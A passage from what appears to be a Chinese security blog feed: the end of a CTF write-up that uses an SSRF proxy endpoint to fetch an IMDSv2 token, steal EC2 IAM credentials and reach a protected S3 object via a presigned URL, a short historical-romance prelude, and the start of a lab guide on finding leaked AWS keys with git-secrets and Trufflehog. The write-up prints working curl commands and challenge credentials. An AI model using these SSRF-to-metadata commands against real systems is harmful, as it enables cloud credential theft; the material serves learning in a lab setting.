安全机制"></a>2.5 获取 Token：绕过 IMDSv2 安全机制</h3><p>那么，如何绕过 IMDSv2 的机制呢？我们可以搜索 AWS 的官方知识文库，找到了一篇文章<a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html" title="《Use the Instance Metadata Service to access instance metadata》">《Use the Instance Metadata Service to access instance metadata》</a>。</p><ul><li>方法一：环境允许的前提下，回退到 IMDSv1；</li><li>方法二：若有命令执行的权限，在实例中执行下面的命令，获取 token 的值。</li></ul><p><img src="/image/image_usZAYKW4gQ.png" alt="图 10：AWS 官方文档记录的通过 token 获取 EC2 实例元数据的方式" title="图 10 ：AWS 官方文档记录的通过 token 获取 EC2 实例元数据的方式"></p><p>我们采用第二种方法，构造以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取 IMDSv2 的 token</span><br>TOKEN=$(curl -s -X PUT \<br>  <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token&quot;</span> \<br>  -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>)<br><br><span class="hljs-comment"># 使用 token 请求 metadata</span><br>curl -s -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> \<br>  <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/image/image_x6vQ5WK44g.png" alt="图 11：成功通过 token 获取到 EC2 实例的元数据" title="图 11 ： 成功通过 token 获取到 EC2 实例的元数据"></p><p>我们可以重点查看<code>iam/</code> 和<code>identity-credentials/</code> 两个 metadata 路径，它们涉及到 AWS 认证凭证。其它的路径多数为信息性字段，不包含可用于权限提升的内容，我们简单了解即可。</p><table><thead><tr><th>路径</th><th>内容</th><th>攻击价值</th></tr></thead><tbody><tr><td>`instance-id`</td><td>实例 ID</td><td>信息性</td></tr><tr><td>`ami-id`</td><td>当前使用的 AMI</td><td>信息性</td></tr><tr><td>`placement&#x2F;availability-zone`</td><td>区域</td><td>信息性</td></tr><tr><td>`hostname`&#x2F;`local-ipv4`</td><td>主机名、私有 IP</td><td>信息性</td></tr><tr><td>`security-groups`</td><td>安全组名称</td><td>可用于侧信道分析</td></tr><tr><td>`mac`&#x2F;`network&#x2F;interfaces&#x2F;`</td><td>网络信息</td><td>可用于网络定位，但不敏感</td></tr></tbody></table><p>当我们访问 <code>iam/</code> 路径后，会返回子路径<code>security-credentials/</code>，然后继续进行路径遍历，就会得到一些凭证信息。<code>identity-credentials/</code> 路径也进行类似的路径遍历操作：</p><ul><li><p><code>iam/security-credentials/challenge01-5592368</code>路径：包含绑定到实例角色的 IAM 角色名和临时凭证</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368&quot;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="/image/image_iKo2qTkwzg.png" alt="图 12：从 EC2 实例的 iam&#x2F;security-credentials&#x2F;challenge01-5592368 路径获取 IAM 临时凭证" title="图 12：从 EC2 实例的 iam&#x2F;security-credentials&#x2F;challenge01-5592368 路径获取 IAM 临时凭证"></p><ul><li><p><code>identity-credentials/ec2/security-credentials/ec2-instance</code>路径：较新格式，用于提供相同类型的临时 AWS 凭证。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&quot;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="/image/image_V-suVkmbOh.png" alt="图 13：从 EC2 实例的  identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance  路径获取 IAM 临时凭证" title="图 13：从 EC2 实例的  identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance  路径获取 IAM 临时凭证"></p><p>遇到两个不同的 IAM 临时凭证，我们可以使用下述命令，对它们的权限进行区分辨认。</p><ul><li><p>步骤 1：使用<code>aws configure set</code> 手动设置所有字段（包括 token）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure <span class="hljs-built_in">set</span> aws_access_key_id YOUR_ACCESS_KEY_ID<br>aws configure <span class="hljs-built_in">set</span> aws_secret_access_key YOUR_SECRET_ACCESS_KEY<br>aws configure <span class="hljs-built_in">set</span> aws_session_token YOUR_SESSION_TOKEN<br><br></code></pre></td></tr></table></figure></li><li><p>步骤 2：查询当前凭证所代表的身份信息；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts get-caller-identity<br></code></pre></td></tr></table></figure></li></ul><p>通过对比，我们得知这两个身份实际都代表同一个 EC2 实例角色，都由同一角色派生，具备同样的权限。</p><ul><li><code>identity-credentials/ec2/security-credentials/ec2-instance</code> 返回的角色名<code>aws:ec2-instance</code>是 AWS 抽象出来的默认名，更注重隐藏角色名细节（例如用于托管服务中），但不利于权限审计。</li></ul><p><img src="/image/image_uE_RWCsndd.png" alt="图 14：识别 identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance 的临时凭证的身份信息" title="图 14：识别 identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance 的临时凭证的身份信息"></p><ul><li><code>iam/security-credentials/challenge01-5592368</code>返回的角色名<code>challenge01-5592368</code>是真实具体的角色名，更便于识别角色来源、权限分析和安全审计。</li></ul><p><img src="/image/image_g4PU-qh09M.png" alt="图 15：识别 iam&#x2F;security-credentials&#x2F;challenge01-5592368 的临时凭证的身份信息" title="图 15：识别 iam&#x2F;security-credentials&#x2F;challenge01-5592368 的临时凭证的身份信息"></p><h3 id="2-6-分析权限：尝试访问-S3-内容"><a href="#2-6-分析权限：尝试访问-S3-内容" class="headerlink" title="2.6 分析权限：尝试访问 S3 内容"></a>2.6 分析权限：尝试访问 S3 内容</h3><p>我们直接拿<code>challenge01-5592368</code>的 IAM 临时凭证来进行测试，试图递归列出存储桶中的对象。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://challenge01-470f711 --recursive<br><br></code></pre></td></tr></table></figure><p>成功过后，我们再将<code>private/flag.txt</code>的文件内容下载下来并直接输出到终端中。但文件下载失败。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">aws s3 cp s3://challenge01-470f711/private/flag.txt -<br></code></pre></td></tr></table></figure><p><img src="/image/image_Ujg069vruY.png" alt="图 16 使用 challenge01-5592368 的 IAM 临时凭证列出 S3 存储桶中的对象，但无法下载" title="图 16 使用 challenge01-5592368的 IAM 临时凭证列出 S3 存储桶中的对象，但无法下载"></p><h3 id="2-7-识别障碍：遭遇数据边界策略阻挡"><a href="#2-7-识别障碍：遭遇数据边界策略阻挡" class="headerlink" title="2.7 识别障碍：遭遇数据边界策略阻挡"></a>2.7 识别障碍：遭遇数据边界策略阻挡</h3><p>题目描述里说了：目标环境使用了 AWS 数据边界（Data Perimeter）来限制对该存储桶内容的访问。那么我们来查看一下我们从 EC2 中获取的 IAM 临时凭证中关于<code>challenge01-470f711</code>存储桶的策略。</p><figure class="highlight plaintext"><figcaption><span>jsx</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs react">aws s3api get-bucket-policy --bucket challenge01-470f711 --query &quot;Policy&quot; --output text | jq .<br></code></pre></td></tr></table></figure><p><img src="/image/image_WiC4fPQQQd.png" alt="图 17：输出 challenge01-470f711 存储桶的策略" title="图 17：输出 challenge01-470f711 存储桶的策略"></p><p>这是一个基于 VPC Endpoint 的访问限制策略，属于 AWS 实施数据边界 控制的一种典型方式。该策略文档的作用是：只有通过 VPCE 为<code>vpce-0dfd8b6aa1642a057</code> 的请求，才能读取<code>private/*</code> 下的对象。否则拒绝。</p><p>AWS 的数据边界是一种安全设计模式，用于限制数据只能在组织内部访问，防止被跨境或跨账户泄露。这里使用的机制是：<strong>S3 + VPC Endpoint + Bucket Policy 中的</strong>**<code>aws:SourceVpce</code>条件 **。属于数据边界策略的一种实现方式，官方在数据外泄防护（DLP）文档中也推荐这种做法。详情请看<a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html" title="《What is Amazon S3?》">《What is Amazon S3?》</a></p><p><img src="/image/image_ul60bJoNwG.png" alt="图 18：AWS 官方推荐的实现数据边界策略的方式" title="图 18：AWS 官方推荐的实现数据边界策略的方式"></p><p>接下来，我们需要总结一下我们前面做了哪些努力，遇到了什么问题。</p><p>假设你站在堡垒的外面，四处被高墙包围，你自己是无法直接潜入的。但你突然发现了一扇窗户：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/<br></code></pre></td></tr></table></figure><p>这不是一扇普通的窗，而是一扇可以帮你传话的窗——你只要把你想说的话（URL）塞进去，它就会替你在内部喊出来。</p><p>而<code>/proxy</code> 接口就是一台放在堡垒里面的传声筒，你只需要在外面悄咪说一句：“帮我看一下 169.254.169.254 嘛～”，它就真的替你问了！而 169.254.169.254 是 EC2 实例的内部情报局元数据服务，外部是绝对接触不到的。</p><p>所以，这就意味着：</p><ul><li>这个 <code>/proxy</code> 很有可能是部署在 EC2 实例中的；</li><li>它属于某个内部网络（VPC），而且这个 VPC 正好连着一个 S3 的 VPC 端点；</li></ul><p>那么你让它发请求，就等于借了一艘在堡垒里的船，帮你偷偷穿过内网，去联系只有“堡垒内部”能访问的 S3 对象。于是，你美滋滋地让 <code>/proxy</code> 去帮你访问 S3，结果 S3 把你挡在门外，一巴掌打回来：Forbidden！！</p><p><img src="/image/image_vzLYj6-VDQ.png" alt="图 19：直接让 &#x2F;proxy 去访问存储桶中的对象失败" title="图 19：直接让 &#x2F;proxy 去访问存储桶中的对象失败"></p><p>为什么？因为 S3 说：“你虽然是从允许的网络（VPC Endpoint）过来的，但你没票啊！”，而这个“票”指的就是签名，也就是访问凭证。即使你通过了网络边界，也得说明你是谁。这个时候你意识到：</p><ul><li><code>/proxy</code>只是一个 HTTP 请求中继接口，它不会使用 EC2 实例自身的 AWS 凭证去发起带签名的 S3 请求；</li><li>它不是用 AWS SDK 写的，也没有自动注入 IAM 临时凭证来“代表你”签名；</li><li>所以即使它从“堡垒内部”发出请求，没有签名的 HTTP 请求也会被 S3 拒绝。</li></ul><p>总结一下就是：你有了一艘偷偷潜入内网的船（<code>/proxy</code>），但船上没有船票（签名），所以还是上不了岸（访问不到 S3）。接下来你需要做的事情是：自己在外面先买好票，然后把票塞给那艘船，再让它进去，就能顺利通行了。</p><p><img src="/image/image_2_sBWwwLJ9.png" alt="图 20：总结前面所做的工作" title="图20：总结前面所做的工作"></p><h3 id="2-8-曲线救国：借用-SSRF-加预签名-URL-偷渡"><a href="#2-8-曲线救国：借用-SSRF-加预签名-URL-偷渡" class="headerlink" title="2.8 曲线救国：借用 SSRF 加预签名 URL 偷渡"></a>2.8 曲线救国：借用 SSRF 加预签名 URL 偷渡</h3><p>若要在外面提前买好票，我们需要生成预签名 URL。<strong>预签名 URL（Presigned URL）</strong> 是 Amazon S3 提供的一种“临时授权链接”，让你可以把 S3 上的私有文件，在限定时间内安全地分享给别人，而不需要给对方任何 AWS 账户或权限。</p><p><img src="/image/image_y5wX5DdYN6.png" alt="图 21：使用预签名 URL 访问原理" title="图21：使用预签名 URL 访问原理"></p><p>执行下述命令，即可生成预签名 URL，详情请看 AWS 官方文档<a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html" title="《使用预签名 URL 共享对象》">《使用预签名 URL 共享对象》</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 presign s3://challenge01-470f711/private/flag.txt <br></code></pre></td></tr></table></figure><p><img src="/image/image_jNB7m3zF3M.png" alt="图 22：生成预签名 URL" title="图 22：生成预签名URL"></p><p>然后，我们再尝试使用 <code>/proxy</code> 去访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=&lt;Presigned_URL&gt;&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="/image/image_x_B9HVQtu6.png" alt="图 23：让 &#x2F;proxy 拿预签名 URL 去访问失败" title="图 23 ： 让 &#x2F;proxy 拿预签名 URL 去访问失败"></p><p>访问失败，并返回：<code>HTTP error: 400 Bad Request</code>。预签名 URL 中包含很多特殊字符，必须进行 URL 编码，否则在作为<code>?url=</code> 参数传给 proxy 时会被截断，导致请求错误。</p><p>所以，我们需要在生成预签名 URL 的时候，同时将其进行完整的 URL 编码。然后再使用 <code>/proxy</code> 进行访问。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -sRr @uri <br></code></pre></td></tr></table></figure><p><img src="/image/image_t_b2U3qBFJ.png" alt="图 24：对预签名 URL 进行 URL 编码后，再让 &#x2F;proxy 去访问" title="图 24：对预签名 URL 进行 URL编码后，再让 &#x2F;proxy 去访问"></p><p>OK，flag 出现了，各位大佬快去试试吧！</p><p><img src="/image/image_pE444Rt2JW.png" alt="图 25：成功获取到 flag" title="图 25：成功获取到 flag"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这道题的攻击核心是利用 SSRF（通过<code>/proxy</code>接口）访问 EC2 实例的元数据服务，从而获取临时 IAM 凭证，接着绕过 S3 所设置的数据边界策略。</p><p>虽然目标环境启用了 IMDSv2，引入了 token 机制增加了攻击门槛，但该机制仍可以通过 SSRF 方式绕过。</p><p>由于 S3 存储桶配置了基于 VPC Endpoint 的访问限制（Data Perimeter），导致即便拥有凭证也无法直接访问受限对象，因此需要借助 AWS S3 的预签名 URL（Presigned URL）实现“提前签票”，再通过<code>/proxy</code> 由内部发起请求，从而成功读取目标数据。</p><p>整个过程的本质是：利用 EC2 的 IAM 凭证进行签名 → 外部生成预签名 URL → 内部 SSRF 发起请求，实现对受保护 S3 对象的访问。</p><table><thead><tr><th>阶段</th><th>Tactic</th><th>Technique</th><th>Procedure</th></tr></thead><tbody><tr><td>初始侦察</td><td>情报收集（Reconnaissance）</td><td>识别暴露的应用服务</td><td>使用`curl`探测 Actuator 接口，发现目标为 Spring Boot 应用，暴露了`&#x2F;actuator&#x2F;env`和`&#x2F;actuator&#x2F;mappings`</td></tr><tr><td>初始访问</td><td>敏感信息收集（Information Disclosure）</td><td>泄露的环境变量</td><td>通过`&#x2F;actuator&#x2F;env` 获取到 S3 Bucket 名称</td></tr><tr><td>权限尝试</td><td>未授权访问（Access Attempt）</td><td>匿名访问 S3 存储桶</td><td>使用`aws s3 ls –no-sign-request` 访问 S3 存储桶失败，提示权限受限</td></tr><tr><td>权限探索</td><td>功能接口分析（API Enumeration）</td><td>枚举 Actuator 接口</td><td>`&#x2F;actuator&#x2F;mappings`揭示了存在 SSRF 的`&#x2F;proxy?url&#x3D;` 接口</td></tr><tr><td>权限提升</td><td>SSRF 攻击</td><td>访问 EC2 元数据服务</td><td>使用`&#x2F;proxy` SSRF 绕过内网隔离，访问 IMDS 获取 token 失败，确认目标使用 IMDSv2</td></tr><tr><td>认证绕过</td><td>SSRF + Token Bypass</td><td>获取 EC2 token</td><td>通过 SSRF`PUT` 请求获取 IMDSv2 token，再通过 token 成功访问元数据</td></tr><tr><td>凭证获取</td><td>获取云凭证（Cloud Credential Access）</td><td>访问 IAM 临时凭证路径</td><td>读取`iam&#x2F;security-credentials`和`identity-credentials` 中的 AWS 临时凭证</td></tr><tr><td>身份识别</td><td>确认凭证身份</td><td>`sts get-caller-identity`</td><td>验证两个临时凭证为相同 EC2 实例角色派生的 IAM 身份</td></tr><tr><td>横向移动</td><td>访问受限资源</td><td>使用 IAM 凭证访问 S3</td><td>使用`aws s3 ls&#x2F;cp`尝试访问`private&#x2F;flag.txt`，但遭遇 VPC Endpoint 限制，访问被拒绝</td></tr><tr><td>数据外泄</td><td>绕过数据边界限制</td><td>使用预签名 URL</td><td>利用 IAM 凭证生成`presigned URL`，并通过 SSRF`&#x2F;proxy` 访问目标对象</td></tr><tr><td>技术细节</td><td>SSRF + URL 编码绕过</td><td>修复 URL 编码问题</td><td>对`presigned URL`使用`jq -sRr @uri` 进行编码，最终成功访问并获取 flag</td></tr></tbody></table><p>我们对这道题目进行了详细说明与拆解，非常适合新手按步骤操作。同时，也有大佬指出可以进一步拓展学习：</p><ul><li>OSS（Object Storage Service）有几种 Bucket Policy？例如，本题涉及的基于身份的访问控制（如 IAM 用户&#x2F;角色访问）以及基于请求来源的条件限制（如 <code>aws:Referer</code>）。</li><li>OSS 的签名方式有哪些？例如，本题考察的基于 Access Key 和 Secret 的签名机制，以及 URL 签名（Presigned URL）：临时生成用于访问私有对象的链接。</li></ul><p>否则，仅仅了解解题思路，却不知道如何进行思考和总结，学习效果会大打折扣。若你觉得本篇文章还有一些不好理解的地方，欢迎进入我们的读者交流群，我们一起探讨。</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS 安全</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有狐（楔子）</title>
    <link href="/2025/05/20/%E6%9C%89%E7%8B%90%EF%BC%88%E6%A5%94%E5%AD%90%EF%BC%89/"/>
    <url>/2025/05/20/%E6%9C%89%E7%8B%90%EF%BC%88%E6%A5%94%E5%AD%90%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>有狐绥绥，在彼淇梁。心之忧矣，之子无裳。</p><p>有狐绥绥，在彼淇厉。心之忧矣，之子无带。</p><p>有狐绥绥，在彼淇侧。心之忧矣，之子无服。</p><p>——《国风·卫风·有狐》</p></blockquote><p>有只小狐狸在那慢慢走，就在淇水石桥上。她的心里真忧愁，她担心他身上没衣裳。</p><p>有只小狐狸在那慢慢走，就在淇水浅滩上。她的心里真忧愁，她担心他没腰带不像样。</p><p>有只小狐狸在那慢慢走，就在淇水河岸旁。她的心里真忧愁，她担心他没衣服她心伤。</p><p>步履蹒跚于漫漫黄沙之中，望天边，一抹晚霞驻留在天际久久未落。轻轻捧起一缕流沙，我想起了年少时嬉戏于青楼楚馆，醉倒在黄公酒垆的日子；忆起了追随父亲南征北站，金戈铁马的时光。我悲恸地阖上眼，茕茕孑立于荒漠中，如今我也要离开了。</p><p>三年过去了，在过去的一千多个日日夜夜，我常常想是不是年少过得太欢乐了，将余生的幸福都用完了，导致我在后来一次又一次的黑夜中需要反复的品尝姐姐和父亲死去的痛苦，每当午夜梦醒，两行清泪落下，枕边人将我抱在怀里：“小狐狸，别怕，有我在，我会护你一生安宁的。”</p><p>手里紧紧握着一枚面具、那是他在我第一次上战场时，亲手为我打造。当时他问我为什么要跑到战场来。</p><p>我告诉他，我担心父亲、二哥、四哥还有… …，话未说完他忽然“扑哧”一声笑了，一只手按在我头上，像是对一个不听话的小妹妹，极有耐心地说教：“我们都是久经战场的人，有什么好担心的。战场非儿戏，岂是你一介小小的女子厮混的地方，还是回将军府去吧。”</p><p>我不服气，反驳道：“父亲说过，斛律家的儿郎各个都是冲锋陷阵的男子汉、为国效忠的好男儿。我才不害怕！”</p><p>“是是是！可你今年才十二岁，还是只小狐狸。”</p><p>“不许叫我狐狸！！！”我怒气朝天，而他只是揶揄一笑，将只面具罩在我脸上。我愣了一会儿揭下面具。</p><p><strong>“狐狸姑娘，你看这个面具是不是特别适合你？”</strong></p><p>过去的仿佛是一个很长很长的梦，反反复复，纠结缠绕，可是从头到尾，都只有一张面孔，他时而清楚，时而模糊，有过笑容明亮的时候，也曾经冰冷淡漠目光犀利… …那些，全部都是他，也只有他。</p><p>一阵风吹来，卷起漫漫黄沙，也撩起我的发丝，暮色降临，天边的斜阳如同鲜血一般的猩红。大漠壮丽的风景渐渐模糊，我无力地倒在荒漠中央，我命本应结束于灭门的那次灾祸中，无奈活了这几些年，反而拖累了无辜的人。上穷碧落下黄泉，孝瓘你是否还会来接我。</p><p>“小狐狸… …”耳畔传来他的绵绵细语，我看到了他向我伸出手，那张我日夜思念的容颜再次重现，我想告诉他，在他走的那些日子，我很坚强，我没有掉眼泪，或悲悯，或嘲讽，或世态炎凉，或人情冷暖，我独自面对着。</p><p>我还想告诉他，自从哥哥们，姐姐和父亲死后，经历了那么多事情、变故，他不仅是我最爱的人，还是我唯一的亲人，我微笑着缓缓将手伸过去… …</p><p>一首歌谣似从远方传来：“敕勒川，阴山下。天似穹庐，笼盖四野。天苍苍，野茫茫。风吹草低见牛羊… …</p><blockquote><p>《乐府广题》云：“北齐神武攻周玉壁，士卒死者十四五，神武恚愤，疾发。周王下令曰：‘高欢鼠子，亲犯玉壁，剑弩一发，元凶自毙。’神武闻之，勉坐以安士众。悉引诸贵，使斛律金唱《敕勒》，神武自和之。”</p><p>东魏武定四年（546），东魏权臣高欢率兵十万从晋阳南向进攻西魏的军事重镇玉壁（今山西南部稷山县西南），折兵七万，返回晋阳途中，军中谣传其中箭将亡，高欢带病强自设宴面会大臣。为振军心，他命部将斛律金唱《敕勒歌》，遂使将士怀旧，军心大振。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>有狐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hunt for Secrets in Git Repos：寻找 Git Repos 中的秘密</title>
    <link href="/2025/05/03/%E3%80%90Pwned-Labs%E3%80%91Hunt-for-Secrets-in-Git-Repos%EF%BC%9A%E5%AF%BB%E6%89%BE-Git-Repos-%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <url>/2025/05/03/%E3%80%90Pwned-Labs%E3%80%91Hunt-for-Secrets-in-Git-Repos%EF%BC%9A%E5%AF%BB%E6%89%BE-Git-Repos-%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-场景介绍"><a href="#0x00-场景介绍" class="headerlink" title="0x00 场景介绍"></a>0x00 场景介绍</h2><p>在为客户评估威胁形势的过程中，你正在对一个不太知名的暗网论坛进行 OSINT（开源情报）调查。</p><p>你在一个讨论高价值目标的帖子中发现了线索。</p><p>在一堆混乱的链接和炫耀言论中，有个用户随口提到发现了一个属于你客户——国际物流巨头 Huge Logistics 的 GitHub 仓库。</p><p>一些地下研究者暗示他们发现了某些东西，但说得很含糊。你的直觉告诉你，这里面肯定还有更多信息等待揭示。</p><p>你的目标？深入分析这个仓库，追踪任何相关的基础设施，发现潜在漏洞——要抢在它成为明天新闻头条之前。</p><p>时间紧迫，你能否先敌一步，击败对手？</p><blockquote><p><strong>🎯 点击【阅读原文】，立即进入靶场环境！</strong></p></blockquote><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><ul><li>基本的 Linux 命令行知识</li></ul><h2 id="0x02-学习目标"><a href="#0x02-学习目标" class="headerlink" title="0x02 学习目标"></a>0x02 学习目标</h2><ul><li>使用 git-secrets 和 Trufflehog 进行敏感信息搜寻</li><li>理解如何预防凭证泄露及如何响应相关事件</li></ul><h2 id="0x03-难度等级"><a href="#0x03-难度等级" class="headerlink" title="0x03 难度等级"></a>0x03 难度等级</h2><ul><li>初学者（Beginner）</li></ul><h2 id="0x04-关注重点"><a href="#0x04-关注重点" class="headerlink" title="0x04 关注重点"></a>0x04 关注重点</h2><ul><li>红队（Red）</li></ul><h2 id="0x05-真实背景"><a href="#0x05-真实背景" class="headerlink" title="0x05 真实背景"></a>0x05 真实背景</h2><p>Git 仓库中泄露凭证是一个非常普遍且真实存在的安全问题。</p><p>凭证被公开可能导致单个系统甚至整个公司网络和平台被攻破。</p><p>除了声誉受损外，还可能带来巨额的云资源账单；更严重的是，如果客户数据因此泄露，来自监管机构的罚款可能会高得惊人。</p><h2 id="0x06-解题思路"><a href="#0x06-解题思路" class="headerlink" title="0x06 解题思路"></a>0x06 解题思路</h2><h3 id="6-1-初步探查"><a href="#6-1-初步探查" class="headerlink" title="6.1 初步探查"></a>6.1 初步探查</h3><p>我们先访问 Github 仓库，它看起来像是一个物流网站，总共有 6 个提交。</p><p><img src="/image/image_W2t7yM8NCj.png"></p><p>将其克隆到本地，进行进一步检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/huge-logistics/cargo-logistics-dev<br></code></pre></td></tr></table></figure><p>在浏览器中打开 <code>index.html</code>，显示如下所示：</p><p><img src="/image/image_y_QLECaMFw.png"></p><h3 id="6-2-git-secrets"><a href="#6-2-git-secrets" class="headerlink" title="6.2 git-secrets"></a>6.2 git-secrets</h3><p><a href="https://github.com/awslabs/git-secrets" title="git-secrets">git-secrets</a>是由<strong>AWS 实验室团队</strong> 开发的一款工具，旨在防止将密码、API 密钥等敏感信息意外提交到 Git 仓库中。</p><p>它的工作原理是：扫描 Git 仓库的内容，使用<strong>预定义的正则表达式规则</strong>来识别常见的敏感信息（如 AWS 密钥、令牌等）。当其检测到匹配项时，会根据配置发出警告或直接阻止提交或推送。</p><p>安装方式如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/awslabs/git-secrets<br><span class="hljs-built_in">cd</span> git-secrets<br>make install<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_LOpb8w45Dz.png"></p><p>我们进入 Git 仓库，git-secrets 为该仓库安装 Git 钩子。执行以下命令后，该仓库中的提交和非快进合并操作将被阻止提交包含敏感信息的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> cargo-logistics-dev/<br>git secrets --install<br><br></code></pre></td></tr></table></figure><p>使用 <code>--register-aws</code> 选项，可将常见的 AWS 模式（即正则表达式规则）添加到 Git 配置中，以确保不会在任何提交中检测到 AWS 密钥和<code>~/.aws/credentials</code> 文件中的密钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git secrets --register-aws<br></code></pre></td></tr></table></figure><p><img src="/image/image_8yiGgZqOwd.png"></p><p>接下来，我们可以对 Git 仓库进行扫描了：</p><ol><li>首先，我们使用 <code>--scan</code> 对仓库进行全盘扫描，但这次扫描并未返回所匹配到的敏感信息。</li><li>然后，我们使用 <code>--scan-history</code> 对仓库的所有历史提交进行扫描。这次，我们扫描出在提交记录<code>d8098af5fbf1aa35ae22e99b9493ffae5d97d58f</code>的<code>log-s3-test/log-upload.php</code> 文件中存在敏感信息<code>AKIAWHEOTHRFSGQITLIY</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git secrets --scan<br>git secrets --scan-history<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_sthaH8jXFm.png"></p><p>我们执行以下命令，查看该提交记录中的文件<code>log-upload.php</code>，便可获取获取 AWS 的登录凭证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git show d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php<br></code></pre></td></tr></table></figure><p><img src="/image/image_4lpaFXY9sa.png"></p><h3 id="6-3-Trufflehog"><a href="#6-3-Trufflehog" class="headerlink" title="6.3 Trufflehog"></a>6.3 Trufflehog</h3><p><a href="https://github.com/trufflesecurity/trufflehog" title="Trufflehog">Trufflehog</a>是另一个用于自动发现 Git 仓库中凭证信息的优秀工具。它有两个版本，下面将分别展示它们的使用命令。</p><p>我们可以使用包管理器快速安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew 